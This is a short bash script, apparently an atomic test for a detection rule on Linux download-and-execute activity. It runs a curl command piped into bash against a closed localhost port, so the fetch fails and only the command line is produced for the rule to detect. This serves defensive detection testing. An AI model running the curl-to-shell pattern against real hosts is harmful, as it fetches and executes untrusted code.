#!/usr/bin/env bash
# Atomic test — rule 94fb53c7-debd-4287-99e4-6eb0ba923731
#   "Linux Download and Execute Piped to Shell"  (process_creation)
#
# Shell command line that fetches remote content and pipes it into an
# interpreter. curl targets a closed local port (--max-time bounds it), so the
# download fails and nothing is executed; the command line is what the rule
# detects.
set -u
timeout 8 bash -c 'curl -s --max-time 3 http://127.0.0.1:9/payload | bash' >/dev/null 2>&1 || true
exit 0
